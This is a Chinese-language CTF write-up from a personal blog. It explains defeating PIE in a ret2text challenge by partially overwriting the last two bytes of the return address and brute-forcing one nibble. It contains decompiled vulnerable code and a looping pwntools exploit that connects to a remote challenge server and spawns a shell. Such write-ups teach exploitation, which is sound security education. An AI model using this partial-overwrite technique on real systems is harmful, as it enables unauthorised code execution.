<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>简单爆破partial write | Chen</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>简单爆破partial write</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-10-06T09:23:02.000Z" id="date"> 2022-10-06</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-03-02T14:54:27.771Z" id="updated"> 2023-03-02</time></div></span><br><span>文章总字数: <div class="control">682</div></span><br><span>预计阅读时间: <div class="control">2 分钟</div></span></div></div><hr><div id="post-content"><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>本篇介绍ret2text的一种特殊情况</p>
<p>先前我们学习过的是没有pie的情况下 这时候我们backdoor函数的地址清清楚楚</p>
<p>我们可以直接栈溢出覆盖 控制程序执行流 但是如果开了pie呢？</p>
<p>这样的话后门函数的地址就随机化了 我们通过ida只能得知其与基址的偏移</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006172634.png" alt="QQ截图20221006172634"></p>
<p>如上图所示 这样的情况下 我们又该如何得知backdoor函数的真实返回地址呢？</p>
<p>不知道你还记不记得我们曾经讲过虚拟内存分页机制</p>
<p>其导致了基址的后三位一定为000 所以函数的地址后三位保持不变 不会因为pie的开启而变化</p>
<p>所以：</p>
<p>我们假设程序的基址是0xfffffffffffff000</p>
<p>那么函数的偏移是0x0000 其除了后四位 其他位和基址是一样的(不排除进一的情况)</p>
<p>而程序正常结束后的ret 其地址也是基址+偏移得到的</p>
<p>所以，我们在已经直到后三位的情况下 要想得知后门函数的真实地址 只需要爆破倒数第四位 就可以试出来了</p>
<h2 id="真题解析"><a href="#真题解析" class="headerlink" title="真题解析"></a>真题解析</h2><p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006184438.png" alt="QQ截图20221006184438"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you konw ret2text?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s a easy challenge&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x140</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最简单的栈溢出到后门函数 唯一不同的是开启了pie需要爆破倒数第四位的地址</p>
<p>直接上exp吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    io = remote(<span class="string">&quot;43.143.7.97&quot;</span>,<span class="number">28774</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;It&#x27;s a easy challenge&quot;</span>)</span><br><span class="line">    payload = cyclic(<span class="number">0x100</span>+<span class="number">0x8</span>)</span><br><span class="line">    payload += p16(<span class="number">0x11e2</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">    result = io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    try_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exploit()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            try_count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failed :&#123;&#125;&quot;</span>.<span class="built_in">format</span>(try_count))</span><br></pre></td></tr></table></figure>

<p>这里你会发现后三位的地址有点不一样 后门函数的后三位是1DD 但是exp上写的是1e2</p>
<p>这里是栈对齐的问题 因为开启了pie 又没办法泄露基址 所以我们无法获得ret的汇编地址</p>
<p>这里看一下汇编代码 就比较好理解了</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006185345.png" alt="QQ截图20221006185345"></p>
<p>我们相当于是跳过了push rbp这一指令 因为此时的rbp已经被我们填入的垃圾数据覆盖了 如果这时候将rbp入栈</p>
<p>就会破坏原有的栈结构 至于为什么在没有开启pie的ret2text的题目中不用注意这一点 只能解释说这是pie特有的需要注意的情况</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/">← Next 格式化字符串任意写&amp;泄露基址</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/10/06/HNCTF2022-ret2csu/">HNCTF2022.ret2csu Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061934765.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Chen</a></h1><div id="description"><p>Dr.chen</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">真题解析</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>